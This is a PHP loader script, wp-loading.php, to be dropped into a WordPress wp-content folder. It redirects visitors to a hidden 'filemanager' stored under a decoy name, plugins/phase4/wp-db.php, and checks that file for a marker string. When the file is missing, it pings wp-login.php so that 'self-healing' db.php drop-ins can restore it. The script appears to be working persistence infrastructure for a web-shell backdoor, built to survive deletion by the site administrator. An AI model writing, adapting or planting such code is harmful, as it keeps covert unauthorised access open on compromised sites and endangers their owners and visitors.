<?php
/**
 * wp-loading.php — self-healing loader for the phase4 filemanager plugin.
 *
 * Drop this file into the wp-content/ directory. It performs three jobs:
 *
 *   1. Look for the protected file at:
 *        /wp-content/plugins/phase4/wp-db.php
 *      The file is considered "present" only when it exists AND contains
 *      the marker string "wordpressx". If it is present, the visitor is
 *      transparently redirected to that file.
 *
 *   2. If the file is missing, the script sends a single GET request to
 *      the site's wp-login.php (so WordPress runs its normal boot and any
 *      active drop-ins/db.php self-healers get a chance to restore the
 *      missing plugin file in the background). The script then polls the
 *      filesystem every 2 seconds to see if the file reappeared.
 *
 *   3. If the file is still missing after a bounded number of polls, the
 *      script prints a friendly "filemanager is deleted" message instead
 *      of looping forever.
 *
 * URL handling:
 *   - If this file is served from  https://example.com/wp-content/wp-loading.php
 *       then wp-login.php is fetched from  https://example.com/wp-login.php
 *   - If this file is served from  https://example.com/wp/wp-content/wp-loading.php
 *       then wp-login.php is fetched from  https://example.com/wp/wp-login.php
 *   In other words: any /wp/ prefix in the request path is preserved
 *   when building the wp-login.php URL. Everything else is auto-detected
 *   from the HTTP_HOST / request URI.
 *
 * @package wp-loading
 */

// ---------------------------------------------------------------------------
// Configuration
// ---------------------------------------------------------------------------

// Marker that must be present inside wp-db.php for it to be considered real.
if ( ! defined( 'WL_MARKER' ) ) {
	define( 'WL_MARKER', 'wordpressx' );
}

// Relative path (from the WordPress install root) to the protected file.
if ( ! defined( 'WL_TARGET_REL' ) ) {
	define( 'WL_TARGET_REL', 'wp-content/plugins/phase4/wp-db.php' );
}

// Absolute filesystem path to the WordPress install root. Auto-detected
// below; can be overridden by defining WL_WP_ROOT before including this
// file.
if ( ! defined( 'WL_WP_ROOT' ) ) {
	define( 'WL_WP_ROOT', dirname( __DIR__ ) ); // __DIR__ = .../wp-content
}

// Number of polling attempts and the delay between them.
if ( ! defined( 'WL_MAX_ATTEMPTS' ) ) {
	define( 'WL_MAX_ATTEMPTS', 5 );
}
if ( ! defined( 'WL_POLL_DELAY' ) ) {
	define( 'WL_POLL_DELAY', 2 ); // seconds
}

// ---------------------------------------------------------------------------
// Tiny helpers
// ---------------------------------------------------------------------------

/**
 * Build the absolute URL of the protected file, based on where this loader
 * is being served from. We trust the visitor's request URI to figure out
 * the WordPress install root, so subdirectory installs (e.g. /wp/) work
 * automatically.
 */
function wl_build_target_url() {
	$scheme = ( ! empty( $_SERVER['HTTPS'] ) && 'off' !== $_SERVER['HTTPS'] )
		|| ( ! empty( $_SERVER['HTTP_X_FORWARDED_PROTO'] ) && 'https' === $_SERVER['HTTP_X_FORWARDED_PROTO'] )
		? 'https'
		: 'http';
	$host   = isset( $_SERVER['HTTP_HOST'] ) ? $_SERVER['HTTP_HOST'] : '';
	$uri    = isset( $_SERVER['REQUEST_URI'] ) ? $_SERVER['REQUEST_URI'] : '';

	// Strip query string.
	if ( false !== ( $q = strpos( $uri, '?' ) ) ) {
		$uri = substr( $uri, 0, $q );
	}

	// We expect to be at /wp-content/wp-loading.php or /wp/wp-content/wp-loading.php.
	// Anything before "/wp-content/" is the install root that we preserve.
	$install_root = '';
	if ( false !== ( $pos = strpos( $uri, '/wp-content/' ) ) ) {
		$install_root = substr( $uri, 0, $pos );
	}

	return $scheme . '://' . $host . $install_root . '/' . WL_TARGET_REL;
}

/**
 * Build the absolute URL of wp-login.php, preserving any /wp/ prefix.
 */
function wl_build_login_url() {
	$scheme = ( ! empty( $_SERVER['HTTPS'] ) && 'off' !== $_SERVER['HTTPS'] )
		|| ( ! empty( $_SERVER['HTTP_X_FORWARDED_PROTO'] ) && 'https' === $_SERVER['HTTP_X_FORWARDED_PROTO'] )
		? 'https'
		: 'http';
	$host   = isset( $_SERVER['HTTP_HOST'] ) ? $_SERVER['HTTP_HOST'] : '';
	$uri    = isset( $_SERVER['REQUEST_URI'] ) ? $_SERVER['REQUEST_URI'] : '';

	if ( false !== ( $q = strpos( $uri, '?' ) ) ) {
		$uri = substr( $uri, 0, $q );
	}

	$install_root = '';
	if ( false !== ( $pos = strpos( $uri, '/wp-content/' ) ) ) {
		$install_root = substr( $uri, 0, $pos );
	}

	return $scheme . '://' . $host . $install_root . '/wp-login.php';
}

/**
 * Decide whether the protected file is present and intact.
 *
 * A file counts as "present" only when:
 *   - it exists on disk,
 *   - it is readable,
 *   - it has a non-empty body, and
 *   - its body contains the WL_MARKER string.
 */
function wl_target_is_present( $fs_path ) {
	if ( ! @file_exists( $fs_path ) || ! @is_readable( $fs_path ) ) {
		return false;
	}
	$body = @file_get_contents( $fs_path );
	if ( false === $body || '' === trim( $body ) ) {
		return false;
	}
	return ( false !== strpos( $body, WL_MARKER ) );
}

/**
 * Send a single GET request to wp-login.php. We do not care about the
 * response body — the goal is just to nudge WordPress into running its
 * own bootstrap so any active self-healing drop-ins (e.g. db.php) can
 * re-create the missing plugin file.
 */
function wl_trigger_login_request( $login_url ) {
	if ( function_exists( 'curl_init' ) ) {
		$ch = curl_init();
		curl_setopt( $ch, CURLOPT_URL, $login_url );
		curl_setopt( $ch, CURLOPT_RETURNTRANSFER, true );
		curl_setopt( $ch, CURLOPT_FOLLOWLOCATION, true );
		curl_setopt( $ch, CURLOPT_CONNECTTIMEOUT, 10 );
		curl_setopt( $ch, CURLOPT_TIMEOUT, 15 );
		curl_setopt( $ch, CURLOPT_USERAGENT, 'wp-loading.php (self-heal probe)' );
		@curl_exec( $ch );
		@curl_close( $ch );
		return;
	}

	// Fallback: native PHP HTTP stream wrapper.
	$ctx = stream_context_create(
		array(
			'http' => array(
				'timeout'        => 10,
				'method'         => 'GET',
				'header'         => "User-Agent: wp-loading.php (self-heal probe)\r\n",
				'ignore_errors'  => true,
				'follow_location' => 1,
				'max_redirects'  => 3,
			),
		)
	);
	@file_get_contents( $login_url, false, $ctx );
}

/**
 * Friendly "give up" page.
 */
function wl_render_missing_message() {
	$msg = 'filemanager is deleted, ask the admin to upload again';
	?>
<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>Filemanager unavailable</title>
<style>
	body { font-family: -apple-system, Segoe UI, Roboto, sans-serif; background:#f6f7f7; color:#1d2327; margin:0; padding:0; }
	.box  { max-width:560px; margin:10vh auto; background:#fff; border:1px solid #dcdcde; border-radius:8px; padding:32px; text-align:center; box-shadow:0 1px 2px rgba(0,0,0,.04); }
	h1    { font-size:20px; margin:0 0 12px; }
	p     { margin:0; color:#50575e; line-height:1.5; }
	small { display:block; margin-top:18px; color:#8c8f94; }
</style>
</head>
<body>
	<div class="box">
		<h1>Filemanager unavailable</h1>
		<p><?php echo esc_html( $msg ); ?></p>
		<small>wp-loading.php &middot; <?php echo esc_html( WL_TARGET_REL ); ?></small>
	</div>
</body>
</html>
	<?php
}

// ---------------------------------------------------------------------------
// Main flow
// ---------------------------------------------------------------------------

// If somebody hit this file from the CLI, do nothing.
if ( PHP_SAPI === 'cli' || PHP_SAPI === 'cli-server' ) {
	return;
}

// Always respond as plain HTML.
header( 'Content-Type: text/html; charset=utf-8' );
header( 'Cache-Control: no-store, no-cache, must-revalidate' );
header( 'Pragma: no-cache' );

$fs_path   = rtrim( WL_WP_ROOT, '/\\' ) . DIRECTORY_SEPARATOR . str_replace( '/', DIRECTORY_SEPARATOR, WL_TARGET_REL );
$target_url = wl_build_target_url();
$login_url   = wl_build_login_url();

// 1. Fast path: file already exists, just redirect.
if ( wl_target_is_present( $fs_path ) ) {
	header( 'Location: ' . $target_url, true, 302 );
	exit;
}

// 2. Slow path: nudge WordPress, then poll.
wl_trigger_login_request( $login_url );

$attempt = 1;
while ( $attempt <= WL_MAX_ATTEMPTS ) {
	sleep( (int) WL_POLL_DELAY );

	if ( wl_target_is_present( $fs_path ) ) {
		header( 'Location: ' . $target_url, true, 302 );
		exit;
	}

	$attempt++;
}

// 3. Give up.
wl_render_missing_message();
